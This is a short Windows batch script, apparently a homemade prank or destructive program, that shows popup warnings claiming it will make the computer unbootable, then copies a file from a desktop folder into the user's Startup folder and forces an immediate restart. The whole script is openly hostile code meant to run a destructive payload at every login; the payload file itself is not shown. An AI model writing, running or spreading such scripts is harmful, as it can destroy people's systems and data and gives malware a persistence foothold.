@echo off
color 24
msg * make sure to run this program in a vertual madchine, it will make your system literally unbootable and fry all your stuff.
msg * (DISCLAIMER: i am not responsible for any damages)
msg * this is all you!
msg * THIS IS YOUR LAST CHANCE TO QUIT IF YOU DONT WANT YOUR COMPUTER FRIED!!!
pause
copy "%USERPROFILE%\desktop\UNBTTw\lib" "%USERPROFILE%\appdata\roaming\microsoft\windows\start menu\programs\startup"
shutdown /f /r /t 0